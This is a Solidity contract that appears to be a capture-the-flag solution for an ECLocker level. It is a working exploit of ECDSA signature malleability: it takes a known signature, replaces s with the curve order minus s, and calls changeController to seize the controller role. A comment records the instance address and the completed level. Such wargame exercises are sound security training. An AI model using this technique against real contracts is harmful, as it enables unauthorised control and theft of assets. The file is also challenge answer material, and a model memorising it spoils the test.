// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ECLocker {
    function changeController(
        uint8 v, 
        bytes32 r, 
        bytes32 s, 
        address controller
    ) external;
}
//EC_locker address = 0x5c752bb3236b1cbcab285e75919a922aa3ab2723
//topic 1 of the isnatnce address is the locker address and i used that as the address to deploy this contract and then executed it and use the run fn and it gave me the success status when i checked in etherscan and then i submitted the level and got the completion msg
contract Solution {
    ECLocker public locker;

    // Constructor to initialize the contract with the ECLocker address
    constructor(address _lockerAddress) {
        locker = ECLocker(_lockerAddress);
    }

    // Function to run the exploit
    function run() public {
        // Signature values
        uint8 v = 28;
        uint256 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        uint256 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;

        // Calculate new s value (modular arithmetic for signature)
        uint256 new_s = 115792089237316195423570985008687907852837564279074904382605163141518161494337 - s;

        // Call the changeController function with the exploit parameters
        locker.changeController(v, bytes32(r), bytes32(new_s), address(0));
    }
}
